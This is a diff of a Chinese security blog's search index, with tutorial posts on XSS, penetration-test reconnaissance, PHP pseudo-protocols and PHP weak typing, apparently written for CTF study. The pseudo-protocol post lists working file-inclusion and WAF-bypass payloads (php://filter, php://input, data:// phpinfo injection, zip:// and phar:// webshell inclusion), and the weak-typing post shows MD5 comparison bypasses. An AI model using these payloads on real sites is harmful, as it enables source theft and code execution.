d12d60bcdeef12ba2fa27bcd42789adc2e9884f8757f76a3814e0c2ac5ffbfa66be4a35d16b8a2951d116f828cbc83b6fd395481093ec1b46b70da32cd4b8128a895aa64b82af489942a8aa781a3f20af5cc31c6c0a8cea2a9f5bda4ff13fcde8ddc2263d7537f9e0586b883cf644f8823e1095ddb29963e5ad4a25e2864cd76475822f983893ea71c5f225ba4c1985e7a2dab5d79806c413b4673c6a6f1fed5a0ac6fb3a4b68eb01cdddb9c8b7bf1ce61966f869786069fff10deb9dc4c77f3e2b2ffc4ab337f6a97d6bbe717721edb6b5b4e849fdd49d72f4e5e03d809f250354f52dca992768f5b7809e859ffaaf414fef1a9feac12451a68777384f7f2ab146b0c33abe9dcf5c9c7e3cb0b7ae0a7cfa10d7a166d694f6c758c1c39e9449f37aaf8464b6dda14a0a3b75460be933887b204cdfc4e229c90d17f153a0f29c65cf7cdd1049fccb4ee194d7838290ffa91baebdc0a389872e90564355cb98a1ba9657b5519562505c2e293ea7897b8944c49243c0b37d7c47d5b028725070ff0504a1b91346d656670475e1b7e712619047062347c491e85440c58262e06932dc868c53f90854ccbdcc52626978ed785341c6173109975ac8edb95b200e3004643429dbfa1a621d94bc4f5ea752438f891650874b906065c0ed506b23a22b8cfa5e76cfea87b77ff8e4a7322ca640f7e876898a25f27ddea0d428e77cb420a1acbb5a2d2440d1ffdeaacb9d2a76bbc93732352843da737320a7503a7acb7a4c56f334440d6a0dd2f75557bcb159469c870874989dbdbeaef5f9092ff9f0443b19ee91d2a633867268c3e31714eb2ce00b96605c45d38e6df12974a8027614ff21a461aab01355e2db5f0cad24e5c6c95c3f17e239c64f0edc844279c6f01e42c0d7b0a805e88f552a1c6357ceeef5730fb12a0df10d2e3af9c187280670a390746e45ab0881ba8856ace760b2f1efbfff718979932328b72e4adfd13fb9b9eb549d21e75f1ae06efae0eb67642ddb1658ff20d8efeba7c67486cd97df806fbbb558f8a47271ca862b89e3dc94df5aaaed21f4cd065d0893eefb94f2e49b652f9d8e201965e194ad69dba3566c70526658565dfea028a8d84de68faa912cba2160af02cfcc98e266ef5ea95c5a959b497973fc1b18f72405a4a09a41dda33ad73a49335e9e4ce1e9ce2f79b94732754ab077412ba5fe93e02da17090eea1d2b05db711524c3a863d22faa720b3219a8faa3b8472af8b10fcbe6b7e9e8f57332cf3f267d6318a312b2175530e55e9112513837df5aa52f86664d6778000b421b127d92c39ad232e528c4f53772e0f98be68d0462280b5ab8f047cd9b058a62b53abb470a28950f0db783711ad7bffc2aedfdfe26bc76bc51b40a9f70d150cf5deeb388e9a34767ff6ab31e3a6952febca054cf16ff93c9d6cdfa30d1112e033ea0ad3fdd081a0fa1bd9a0fa93edfec40c20dfd39e919c1b1e766a8ae4cd8f5760ae85e839244f4371225efbb444e6503a3142119694f74f87890e3e437d7e106ba1f8fe6e8af1b1f1ecfbcccfcbd9e5f6cfdfa86187bed4a50dfd637f0b116c9f0045460f322ec63a4ad814491f7cf53292638b6f388c48bb04609014466ad904f886f2f326a7c8312fc015aa802250d5d62bd62a0670d87bcb032c387a708cb423f51e15c56aa2f3798aa95d5610c45c8035bebf3b87ddad56d4f24645cf88a0058b86126038007327e47442962f32a7229b880a35af56a87cb6606193a1758767297c984adf8716561c02d89aec7f07efa9b582086b4d3fd9630cb20a481e9f26e463856fadf04797168ded47046ee1f90db662a26be1c6006ce880199a71a36600d22383ea222f3e39bf71791c0f06671b6ccf67e7fe6f1f221351bb39ff6fe5439abe31fd8752a43dfa6b615bda982f97c19883650ef6050f3ad13e500ae04c44001a8933c736321c25ffb58b48a0215bc9bfc967b04ff54b04a7106a43eeb6719dc65f2e4f8a9ad597f476f015cdff5448f7c5d3da2e0d4abcfa2e892befce4a0bab55c19bd4f26be35fe78a928f59923559bf85b295a9c1435155857178da50d641d7483efbcbd40c2c81c4bc71f9f3807b8060502a8c064f540d5928af7690d27cfc101753d2e97db3024f6fa8a847bb08eae75ceb7178f37aff75e56d53058baf852d401e8c7a53959c406b281444284cf4f84f3803c7c443704d04a342dae301d3bbb4d0e336929a1a16bd8dee3755d4d6c9d7e0480a2037f020040795312ffd76e39e0baec18f21317f4bed55d995b38f14e1ebc6275124db44c7503f06faa7f6cd3ddf1ad8fa990431bab514ad9ede5d1dc0416b520d5902ca6ef7e49fbda99501d278a4888f27a38bbaf3534f33abb755215bee7e283b011c93f9f37561f0a0d05546278b258f0a4ca661255659bbac21b4d283e6574e84ee31d0e2a8ecfee6a5590bc0f0dcb396532461cb78a9c43ef3f041521a98f3090085ff2f90cb164259d70d1bb2555db20986c7cb2f33bf8714951c8514b3e2fb94fc107f8b101e4538648eefe44a806ae52ea4abb20f86220e04c24918da1156d26fdba56f1b3dc7d7f69dbaaf56fce3afdaf8ce9f33a361aa65280207a41169937e8cf1b36cbd533aeec93cb71c34ba3e742f71ead87d0af5ce006c54212901056b8f4b6784fd7a5a301d9ded94c230462e01b3bd43a5fe60eacbe330250b800596ae0ba9070b82ac237b4bc6ed1a3fa80a59e555c73e0568f63930b9fa32cdc1e6423ecceb308b5a23763de2c36403d121f2359a48b20e0c8e3e0dbfb53f8d914a763f94af23fe693cf68ba50df407e82ef06c787b5a04b7d5d20b0d7baa3b25c32bb2c8ef10a8c6048136907d3d9ea6ac1e1126a152f3a8eb60a3202179cc907da74dab6a9e52045e0f483acf34c9cf649ba1669e6cfe964baa0e3cc24e55849fcfbfce15b5453839f585cd2e0381c0320085ca74327d1d0f277c0fd8c3f1c167fc6a17cfbe6a54a0e3eca979037f64284d9ee04b77b4c86a9b51e683106817d0bc05c64ee1ed5c77ba8e7874a4462a0d03df9e67eac9e205663bfef7b1ba7394a5e6128b96206b95f8d49aad68f364ec36cec1b6cc4befee682dd98b55b099e3312eb11f4637a86944ed51c4fe045bee143c2232dba4c6b34f4b1c5744b38250ed78516971f39039fd9575a912bbd2cc7319604ad48b382f90c87682c2eeac62747ac7a1aae7cedf52379c156bb781daada208b9237bab4f7ba11cb4d608a4993be70ceae442a74486f00e363551ee2c82dbd836a59301dbc091dd27b6937e19d47c823891525b8a306491e20b84427691560086636aaff4358f83c69b2c30a5999b933ee4e21799518171ea434460cddd638235a1bf403cc7ec4247982b4a40f900e0eba434f25a71b22674e9f8d04b292dc23a5731cc31aacd148e9f423b22580718bb0f97f92e5ea4569bf63ae23746cd8bcc39ce247f8e1e15e7b4495923e53a5c26da6c10617743a96caff3f785009e1d4eb8a45835f923dafce71dd3a9435d356b36ba0df3c4d4641bfa71b7eca86b25a17cfcceebfa031489fc439e39dd1df39d20702bd23b1d8fcfaeba2a63c28f3df56debfc5b7e27871cbcc29bfa100e78ef8f3d1ddb622838146337f2b8087004bfef722d424bf1b6127a12b2b75a4c99f61a555d07b2d45ba06ad30abc5b85b695b5dffbc394b18fbbbeed02cc4f6355bf75c8311b6dec0ea24eae011f9493f7f496f7b4b1f261428db04eb2d3ae7ea3a00c89998592f97db0c072d245ea9749541d17dfd891802e46d74525e82dcc41ab4c6e7cca842484dbd9d214b2758bfef37187babdf9108f686783a16b77816b088265ecc01af092b029763a8f6c421073a685375109a2e22f80c827959cda90a1c2d1728c1ae8c20a243b9a2911f1985361161c87c21be79c9339218417359c898eab75547b385bed236322388e68614650459cfc7ab0d4bff9f0df88a002d9f6e04ce74e55e7281de6d8cff6d7d3cd60526692d4699beb8ac40bd3dc66e49a4aa5c0ea3da1bf6116ddb501df057c3c8a13fcaae2e8687b70d161137a8564688a2abf26f41bbd7c6043017096783ae789aa0ca315f12bd6eaed10794559bff75e8396ae7c6c997ca72e2f6fc1a08f9f0e7bf05b7b58b7339a64c155b575c9863130132aa2affa90259dab79c825fc20cea640cbf8d1bfdc2ac9b2066889a432388506b07847edfb23952322eb2524fb57d6eace6b646f6e9a3e7c5a1663470b690e8bae0cfd04d715ebba14ae23450f37be60c2627f784616b3b4350bca682ddf6c7dc46d13f2dfb59ea51dafea116c700afc9e001a2f315993b3a9930ca0a679cc14652658b0a2d8610436129eda48f969d871b19c3f56cc0867aee59b2baac4f52387e94c9b21f19ec25e62e181593751a1d6cab2d8cbf41de1488e83aaddfe345d22e290e3b67ae3e504263a8c7b265baba5cfdbe821ee82edbf98d746b4b58c188a387966a98278856b872f8cded4c35a88ebb23249ca489b9882949fcab58da0153253ea5e65422766fa4359754a9175ed63d96bca931255324cb5ead6c1f9f9612569a0fcb875fd83949d1e7802f49cd2ea1ea17f5cc570d70110562f6a69ce232fd6420995a7a77dc3c7ab85d0a4a3ddcbf990e5c385a778923887123df5251f8c6506357faefd80d8daf9828addb058d01da078d7d17b6b3a5950ba59bd29eddbcdfe846583217586c0e8b03f453802e8e76bba1510f1917b784e58fadcd2d83edacb43c5e4f9f1554d71c45d233b52d708244be6383d8b81e2f06f4fbb3f05e485568ef9ad346f7ad5e6f788c8b4021045ac36d7f7aae134dbdccdb925d1dacf0714dfc1556f78810873c7ec001ab16c95c61ef620c16e5b0bddc3a109ccf57c6e5752b8d7d264dac204847aaaf04606b6e24d699e1504fc8dc012af61107723d5fdb134985dcb88b9955e4e55f28b1d002854bdf3671f7fc8ef1e09acb69857e561ac60de6cde474ee57013f26ad27253aa165848fb0ce6b98d80770ecadba287ba04bf31fc85798c1a0f20aa7085420dd6ef915df7d7ac725b950ca0148811eb57a1c0c087519abf7eafc44fc7383e48ee25cfa8ab58ea583946a8b90b21bb528f2fff43a9eaf410fceb24a47b09400b64dea8e79323839600e843f4a5ee651b4a665b1fc8c00063ca744290ae2e514c72277a574d74183c0834e7167bccb1dad2e33b861ce5cc94ec150bca884b52b463acc9675a7dc33efb40f97ea79711a7040310c3799a1662fc</script>
-</div>
-<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
+    <title>XSS从0到1</title>
+    <url>/posts/46185.html</url>
+    <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>跨站脚本(Cross-Site Scripting,简称为XSS或跨站脚本或跨站脚本攻击)是一种针对网站应用程序的安全漏洞攻击技术，是代码注入的一种。它允许恶意用户将代码注入网页，其他用户在浏览网页时就会受到影响。恶意用户利用xss代码攻击成功后，可能得到很高的权限、私密网页内容、会话和cookie等各种内容。</p>
+<p>XSS攻击可以分为三种： 反射型、存储型和DOM型。</p>
+<h2 id="0x01-反射型XSS"><a href="#0x01-反射型XSS" class="headerlink" title="0x01 反射型XSS"></a>0x01 反射型XSS</h2><p>反射型XSS又称非持久型XSS，这种攻击方式往往具有一次性。</p>
+<p>攻击方式： 攻击者通过电子邮件等方式将包含XSS代码的恶意连接发送给目标用户。当目标用户访问该链接时，服务器接收该目标用户的请求并进行处理，然后服务器把带有xss代码的数据发送给目标用户的浏览器，浏览器解析这段xss代码，就会触发xss漏洞。</p>
+<h2 id="0x02-存储型XSS"><a href="#0x02-存储型XSS" class="headerlink" title="0x02 存储型XSS"></a>0x02 存储型XSS</h2><h2 id="0x03-DOM型XSS"><a href="#0x03-DOM型XSS" class="headerlink" title="0x03 DOM型XSS"></a>0x03 DOM型XSS</h2>]]></content>
       <categories>
-        <category>漏洞复现</category>
+        <category>WEB</category>
       </categories>
       <tags>
-        <tag>漏洞复现</tag>
+        <tag>XSS</tag>
       </tags>
   </entry>
   <entry>
@@ -1378,85 +1457,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Web渗透测试-信息收集总结</title>
-    <url>/posts/44511.html</url>
-    <content><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>信息收集分为：被动信息收集和主动信息收集。</p>
-<p><strong>被动信息收集</strong><br>不会与目标服务器做直接的交互，在不被目标系统察觉的情况下，通过搜索引擎、社交媒体等方式对目标外围的信息进行收集。</p>
-<p><strong>主动信息收集</strong><br>和被动信息收集相反，主动收集会与目标系统有直接的交互，从而得到目标系统相关的一些情报信息。</p>
-<p>没有一种方式是最完美的，每个方式都有自己的优势，主动方式，你能获取更多的信息，但是目标主机可能会记录你的操作记录。被动方式，你收集的信息会相对较少，但是你的行动并不会被目标主机发现。一般在一个渗透项目下，你需要有多次的信息收集，同时也要运用不同的收集方式，才能保证信息收集的完整性。</p>
-<h1 id="0x01-信息收集"><a href="#0x01-信息收集" class="headerlink" title="0x01 信息收集"></a>0x01 信息收集</h1><h2 id="DNS域名信息收集"><a href="#DNS域名信息收集" class="headerlink" title="DNS域名信息收集"></a>DNS域名信息收集</h2><p>我们需要收集域名对应的 ip，域名注册人、DNS记录、子域名等等一系列与域名相关的信息。<br>扫描域名信息的工具由很多，比如：Whois、DIG、Layer、Dnsenum、dnsmap、Fierce、Dmitry、Maltego等等<br>传送门：</p>
-<p><a href="https://blog.csdn.net/qq_36119192/article/details/84068625" target="_blank" rel="noopener">DNS域名探测工具的使用whois、DIG、Layer、dnsenum</a></p>
-<p>在线子域名查询地址：<a href="https://phpinfo.me/domain/" target="_blank" rel="noopener">https://phpinfo.me/domain/</a></p>
-<h2 id="操作系统类型"><a href="#操作系统类型" class="headerlink" title="操作系统类型"></a>操作系统类型</h2><p>服务器信息包括服务器用的操作系统：Linux 还是 Windows 。现在企业网站服务器的操作系统有百分之九十以上用的是Linux操作系统。知道了服务器的操作系统之后，还需要知道操作系统使用的具体版本。因为很多低版本的操作系统都存在已知的漏洞。</p>
-<ul>
-<li><p>判断是Linux还是Windows最简单就是通过ping来探测，Windows的TTL值都是一般是128，Linux则是64。所以大于100的肯定是Windows，而几十的肯定是Linux。<br><img src="/posts/44511/%E6%94%B6%E9%9B%862.png" alt></p>
-</li>
-<li><p>可以使用nmap的“-O”参数，来初步判断服务器系统类型：<br><img src="/posts/44511/1.png" alt></p>
-</li>
-<li><p>大小写<br>访问网站：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.xxx.com&#x2F;index.html</span><br><span class="line">http:&#x2F;&#x2F;www.xxx.com&#x2F;inDex.html</span><br></pre></td></tr></table></figure>
-<p>Windows操作系统不区分大小写，Linux系统大小写敏感，用此方法能够判断是Windows还是Linux系统。</p>
-</li>
-</ul>
-<h2 id="网站容器-Apache-Nginx-Tomcat-IIS"><a href="#网站容器-Apache-Nginx-Tomcat-IIS" class="headerlink" title="网站容器(Apache/Nginx/Tomcat/IIS)"></a>网站容器(Apache/Nginx/Tomcat/IIS)</h2><p>知道了这些信息之后，我们就需要知道网站用的web服务器是什么类型的：Apache、Nginx、Tomcat 还是 IIS。知道了web服务器是哪种类型后，我们还要探测web服务器具体的版本。比如Ngnix版本&lt;0.83会有解析漏洞 ，IIS6.0会有文件名解析漏洞、IIS7.0会有畸形解析漏洞等。不同的web服务器版本，存在着不同漏洞。</p>
-<p>探测网站是哪种web服务器，可以使用工具 whatweb 。</p>
-<p>传送门：<a href="https://blog.csdn.net/qq_36119192/article/details/84061734" target="_blank" rel="noopener">网站指纹识别工具Whatweb的使用</a></p>
-<h2 id="脚本类型-php-jsp-asp-aspx"><a href="#脚本类型-php-jsp-asp-aspx" class="headerlink" title="脚本类型(php/jsp/asp/aspx)"></a>脚本类型(php/jsp/asp/aspx)</h2><p>我们需要知道网站用的脚本类型：php 、Jsp 、Asp 、Aspx 。</p>
-<ul>
-<li><p>可以根据网站URL来判断</p>
-</li>
-<li><p>site:xxx  filetype:php</p>
-</li>
-<li><p>可以根据Firefox的插件来判断</p>
-<p><img src="/posts/44511/%E6%94%B6%E9%9B%863.png" alt></p>
-</li>
-</ul>
-<h2 id="数据库类型-Mysql-Oracle-Accees-Mqlserver"><a href="#数据库类型-Mysql-Oracle-Accees-Mqlserver" class="headerlink" title="数据库类型(Mysql/Oracle/Accees/Mqlserver)"></a>数据库类型(Mysql/Oracle/Accees/Mqlserver)</h2><p>我们需要知道网站用的是哪种类型的数据库：Mysql、Oracle、SqlServer 还是 Access 。虽然这几种数据库的语法大体上相同，但是还是有区别的。所以我们还是要知道目标网站用的是哪种数据库，并且数据库是哪个版本的.</p>
-<h2 id="主机扫描-AWVS、Nessus"><a href="#主机扫描-AWVS、Nessus" class="headerlink" title="主机扫描(AWVS、Nessus)"></a>主机扫描(AWVS、Nessus)</h2><p>对目标主机进行扫描，而不仅仅是对网站进行扫描，扫描目标主机开放了哪些端口，扫描端口运行的服务，目标主机上有哪些漏洞。</p>
-<p>传送门：<br><a href="https://l1395851238.github.io/2019/03/20/awvs-de-ji-ben-shi-yong/" target="_blank" rel="noopener">AWVS的基本使用</a><br><a href="https://blog.csdn.net/qq_36119192/article/details/82852117" target="_blank" rel="noopener">Nessus扫描器的使用</a></p>
-<h2 id="CMS类型"><a href="#CMS类型" class="headerlink" title="CMS类型"></a>CMS类型</h2><ul>
-<li><p>robots.txt文件</p>
-<p><img src="/posts/44511/2.png" alt></p>
-<p>从wp路径可以看出这个是WordPress的cms</p>
-</li>
-<li><p>通过版权信息进行查询<br>一般直接拉到底部查看版权信息，有些站点会显示出来</p>
-</li>
-<li><p>通过查看网页源码的方式<br><img src="/posts/44511/3.png" alt></p>
-</li>
-</ul>
-<h2 id="旁站和C段扫描"><a href="#旁站和C段扫描" class="headerlink" title="旁站和C段扫描"></a>旁站和C段扫描</h2><p>旁站指的是同一服务器上的其他网站，很多时候，有些网站可能不是那么容易入侵。那么，可以查看该网站所在的服务器上是否还有其他网站。如果有其他网站的话，可以先拿下其他网站的webshell，然后再提权拿到服务器的权限，最后就自然可以拿下该网站了！</p>
-<p>C段指的是同一内网段内的其他服务器，每个IP有ABCD四个段，举个例子，192.168.0.1，A段就是192，B段是168，C段是0，D段是1，而C段嗅探的意思就是拿下它同一C段中的其中一台服务器，也就是说是D段1-255中的一台服务器，然后利用工具嗅探拿下该服务器。<br>旁站和C段在线查询地址：<br><a href="http://www.webscan.cc/" target="_blank" rel="noopener">http://www.webscan.cc/</a><br><a href="http://www.5kik.com/" target="_blank" rel="noopener">http://www.5kik.com/</a></p>
-<ul>
-<li><p>在线查询网站<br><a href="https://phpinfo.me/bing.php" target="_blank" rel="noopener">https://phpinfo.me/bing.php</a><br><img src="/posts/44511/4.png" alt></p>
-</li>
-<li><p>站长之家<br><a href="http://tool.chinaz.com/" target="_blank" rel="noopener">http://tool.chinaz.com/</a><br><img src="/posts/44511/5.png" alt></p>
-</li>
-</ul>
-<h2 id="开放端口"><a href="#开放端口" class="headerlink" title="开放端口"></a>开放端口</h2><p>nmap扫描<br><code>nmap -F -sT -v -n 45.33.49.119-120</code></p>
-]]></content>
-      <categories>
-        <category>Web</category>
-      </categories>
-      <tags>
-        <tag>渗透</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>XSS从0到1</title>
-    <url>/posts/46185.html</url>
-    <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>跨站脚本(Cross-Site Scripting,简称为XSS或跨站脚本或跨站脚本攻击)是一种针对网站应用程序的安全漏洞攻击技术，是代码注入的一种。它允许恶意用户将代码注入网页，其他用户在浏览网页时就会受到影响。恶意用户利用xss代码攻击成功后，可能得到很高的权限、私密网页内容、会话和cookie等各种内容。</p>
-<p>XSS攻击可以分为三种： 反射型、存储型和DOM型。</p>
-<h2 id="0x01-反射型XSS"><a href="#0x01-反射型XSS" class="headerlink" title="0x01 反射型XSS"></a>0x01 反射型XSS</h2><p>反射型XSS又称非持久型XSS，这种攻击方式往往具有一次性。</p>
-<p>攻击方式： 攻击者通过电子邮件等方式将包含XSS代码的恶意连接发送给目标用户。当目标用户访问该链接时，服务器接收该目标用户的请求并进行处理，然后服务器把带有xss代码的数据发送给目标用户的浏览器，浏览器解析这段xss代码，就会触发xss漏洞。</p>
-<h2 id="0x02-存储型XSS"><a href="#0x02-存储型XSS" class="headerlink" title="0x02 存储型XSS"></a>0x02 存储型XSS</h2><h2 id="0x03-DOM型XSS"><a href="#0x03-DOM型XSS" class="headerlink" title="0x03 DOM型XSS"></a>0x03 DOM型XSS</h2>]]></content>
-      <categories>
-        <category>WEB</category>
-      </categories>
-      <tags>
-        <tag>XSS</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>git泄露</title>
     <url>/posts/55935.html</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近在做ctf的题，碰到了GitHack，刚好大佬学长有一道这方面的题，拿来练练手。现在总结一下。</p>
@@ -1500,6 +1500,67 @@
       </tags>
   </entry>
   <entry>
+    <title>php伪协议</title>
+    <url>/posts/3072.html</url>
+    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>PHP伪协议在CTF中经常出现，也经常跟文件包含，文件上传，命令执行等漏洞结合在一起，所以本文章对常见的一些协议进行总结。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file:&#x2F;&#x2F; — 访问本地文件系统</span><br><span class="line">http:&#x2F;&#x2F; — 访问 HTTP(s) 网址</span><br><span class="line">ftp:&#x2F;&#x2F; — 访问 FTP(s) URLs</span><br><span class="line">php:&#x2F;&#x2F; — 访问各个输入&#x2F;输出流（I&#x2F;O streams</span><br><span class="line">zlib:&#x2F;&#x2F; — 压缩流</span><br><span class="line">data:&#x2F;&#x2F; — 数据（RFC 2397）</span><br><span class="line">glob:&#x2F;&#x2F; — 查找匹配的文件路径模式</span><br><span class="line">phar:&#x2F;&#x2F; — PHP 归档</span><br><span class="line">ssh2:&#x2F;&#x2F; — Secure Shell 2</span><br><span class="line">rar:&#x2F;&#x2F; — RAR</span><br><span class="line">ogg:&#x2F;&#x2F; — 音频流</span><br><span class="line">expect:&#x2F;&#x2F; — 处理交互式的流</span><br></pre></td></tr></table></figure>
+
+<p><strong>今天着重研究php://</strong></p>
+<p>有两个比较重要的配置在<code>php.ini</code>中，<code>allow_url_fopen</code> 和<br><code>allow_url_include</code>会影响到<code>fopen</code>等等和<code>include</code>等等函数对于伪协<br>议的支持，而<code>allow_url_include</code>依赖<code>allow_url_fopen</code>，所以<br><code>allow_url_fopen</code>不开启的话，<code>allow_url_include</code>也是无法使用的。</p>
+<h2 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h2><h3 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h3><p><code>php://input</code>代表可以访问请求的原始数据，简单来说<code>POST</code>请求的情况下，<code>php://input</code>可以获取到post的数据。</p>
+<ul>
+<li><strong>使用条件：include()、include_once()、file_get_contents()</strong></li>
+</ul>
+<p>比较特殊的一点，<code>enctype=”multipart/form-data”</code> 的时候 php://input 是无效的。</p>
+<h3 id="php-output"><a href="#php-output" class="headerlink" title="php://output"></a>php://output</h3><p>php://output 是一个只写的数据流，允许你以 <code>print</code> 和 <code>echo</code> 一样的方式写入到输出缓冲区。</p>
+<h3 id="php-filter-重点"><a href="#php-filter-重点" class="headerlink" title="php://filter(重点)"></a>php://filter(重点)</h3><p>这篇文章的关键在于讨论<code>php://filte</code>r,事实上，这也是我们常常使用的一个伪协议，在任意文件读取，甚至getshell的时候都有利用的机会。</p>
+<p><code>php://filter</code> 是一种元封装器， 设计用于数据流打开时的筛选过滤应用，也就是作为一种过滤器，可以使用在数据流产生的地方。</p>
+<p>这对于一体式（all-in-one）的文件函数非常有用，类似 <code>readfile()</code>、 <code>file()</code> 和 <code>file_get_contents()</code>， 在数据流内容读取之前没有机会应用其他过滤器。</p>
+<p>事实上，在<code>include</code>函数的使用上，经常会造成任意文件读取漏洞，而<code>file_get_contents()</code>和<code>file_put_contents()</code>这样函数下，常常会构成getshell等更严重的漏洞。</p>
+<h2 id="URL中包含点的常见形式"><a href="#URL中包含点的常见形式" class="headerlink" title="URL中包含点的常见形式"></a>URL中包含点的常见形式</h2><ul>
+<li><p><code>?file = xxx 或者 ?file = xxx.php</code></p>
+<p>那么源码中的写法：</p>
+<p><code>include($file.&#39;php&#39;) 或者 include($file)</code></p>
+<p>这里直接使用伪协议包含：</p>
+<p><code>?file=php://filter/read=convert.base64-encode/resource=login</code></p>
+</li>
+<li><p><code>?action = xxx &amp; mode = xxx</code></p>
+<p>这里形式就是文件夹加上文件名的方法</p>
+<p><code>http://www.example.com/index.php?action=front&amp;mode=login</code></p>
+<p>那么源码中的写法：</p>
+<p><code>include($action.&#39;/&#39;.$mode.&#39;.php&#39;);</code></p>
+<p>那么对于这种情况使用的伪协议包含形式：</p>
+<p><code>?action=php://filter/read=convert.base64-encode/resource=./&amp;mode=login</code></p>
+</li>
+</ul>
+<h2 id="举个例子"><a href="#举个例子" class="headerlink" title="举个例子"></a>举个例子</h2><p>题目链接：<a href="http://level3.tasteless.en/" target="_blank" rel="noopener">http://level3.tasteless.en/</a></p>
+<p>题目直接给出了源码：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(&#39;index.php&#39;);</span><br><span class="line">&#x2F;*</span><br><span class="line">view file: php.ini</span><br><span class="line">so here is my hint: the included php.ini file is part of the configugartion file used on the server the bug was found.</span><br><span class="line">so there will be something in it which enables you to solve this level, wont?</span><br><span class="line"></span><br><span class="line">always be UP TO DATE!</span><br><span class="line"></span><br><span class="line">hint enough, might just take you seconds to do?!</span><br><span class="line">*&#x2F;</span><br><span class="line">error_reporting(0);</span><br><span class="line">include(&#39;anti_rfi.php&#39;); &#x2F;&#x2F;rfi is forbidden!!!!!</span><br><span class="line"></span><br><span class="line">$inc &#x3D; @$_GET[&#39;file&#39;];</span><br><span class="line">@require_once($inc);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>用php://input直接就能执行任意代码<br><img src="/posts/3072/%E4%BC%AA%E5%8D%8F%E8%AE%AE1.jpg" alt></p>
+<h3 id="绕过waf的方法"><a href="#绕过waf的方法" class="headerlink" title="绕过waf的方法"></a>绕过waf的方法</h3><p>在一些ctf中会对一些伪协议的关键词进行过滤，如read、resource等等，下面总结了几条绕过方法，在实战总作为字典来跑。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?f&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;login.php（过滤了操作名read）</span><br><span class="line"></span><br><span class="line">?f&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;1.jpg&#x2F;resource&#x3D;.&#x2F;show.php（正则 &#x2F;resource&#x3D;*.jpg&#x2F;i）</span><br><span class="line"></span><br><span class="line">?f&#x3D;data:text&#x2F;plain,&lt;?php phpinfo()?&gt;</span><br><span class="line"></span><br><span class="line">?file&#x3D;data:text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpPz4&#x3D;</span><br></pre></td></tr></table></figure>
+
+<h2 id="截断包含"><a href="#截断包含" class="headerlink" title="截断包含"></a>截断包含</h2><h3 id="截断"><a href="#截断" class="headerlink" title="截断"></a>截断</h3><p>这里技巧现在应该是用的比较少了，因为利用截断要满足下面的两个条件：</p>
+<ul>
+<li><p>php版本小于5.3.4</p>
+</li>
+<li><p>magic_quotes_gpc为off</p>
+</li>
+</ul>
+<h3 id="截断-1"><a href="#截断-1" class="headerlink" title="./ 截断"></a>./ 截断</h3><p>点号和路径截断以及./截断，也就是填充大量的./使url长度超过最大值，来达到截断的目的。</p>
+<p>具体可以看下面的文章：<a href="https://blog.csdn.net/zvall/article/details/8951925" target="_blank" rel="noopener">https://blog.csdn.net/zvall/article/details/8951925</a> </p>
+<h2 id="zip协议和phar协议"><a href="#zip协议和phar协议" class="headerlink" title="zip协议和phar协议"></a>zip协议和phar协议</h2><p>在实战过程中，若发现存在文件上传但是没有办法直接上传php文件，可以传zip压缩文件，我们就利用这两个协议，将php文件打包成zip文件来包含里面的php脚本。</p>
+<p>phar://、zip://，都可以看到在phpinfo中有相应的描述。</p>
+<p>例如脚本文件为1.php，打包成1.zip，然后再改名为1.jpg，上传之后包含1.jpg中的php文件即可。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">zip:&#x2F;&#x2F;..（当前脚本的绝对路径）...&#x2F;1.jpg#1.php</span><br><span class="line">phar:&#x2F;&#x2F;...（当前脚本的绝对路径）...&#x2F;1.jpg&#x2F;1（分割不加后缀名）</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>PHP</category>
+      </categories>
+      <tags>
+        <tag>php</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Hello World</title>
     <url>/posts/16107.html</url>
     <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
@@ -1516,6 +1577,32 @@
       </categories>
       <tags>
         <tag>hexo</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>php弱类型</title>
+    <url>/posts/21181.html</url>
+    <content><![CDATA[<p>弱类型</p>
+<p>比较：<br>=== 强等于 ：先判断两种字符串的类型，再比较<br>==  弱等于 ：先将字符串类型转换成相同，再比较</p>
+<a id="more"></a>
+<p>如果一个数值和字符串进行比较的时候，会将字符串转换成数值<br>Abc == 0<br>1abc == 1<br>Abc1 == 0<br>0e123 == 0e456 //0e被识别为科学计数法</p>
+<p>如果该字符串没有包含’.’,’e’,’E’并且其数值值在整形的范围之内<br>该字符串被当作int来取值，其他所有情况下都被作为float来取值，该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为0</p>
+<p>a = 1 + “10.5”  //a = 11.5<br>b = 1 + “-1.1e3” //a = -1099<br>c = 1 + “ab123”   //c = 1<br>d = 1+”2ab”    //d = 3</p>
+<p>MD5绕过<br>0e在比较的时候会将其视作为科学计数法，所以无论0e后面是什么，0的多少次方还是0</p>
